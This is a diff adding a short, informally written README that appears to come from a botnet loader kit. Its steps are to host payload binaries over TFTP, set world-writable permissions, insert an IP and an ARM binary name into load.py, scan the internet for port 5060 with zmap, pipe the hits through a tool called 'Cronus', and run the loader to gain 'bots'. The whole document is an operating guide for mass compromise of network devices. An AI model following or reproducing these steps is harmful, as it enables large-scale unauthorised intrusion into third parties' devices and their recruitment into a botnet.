@@ -1,0 +1,11 @@
+make sure tftp i senabled follow this https://www.cyberphoton.com/tftp-server-in-rhel7
+put files on your server
+chmod 777 *
+pip install colorama
+edit load.py 
+111.111.111.111 replace with your net ip 
+gift.arm5 with your arm5 bin name
+zmap -p5060 -w gg | ./Cronus > out
+python load.py out
+boom bots!!!!
+ps:maybe unstable due to my killer
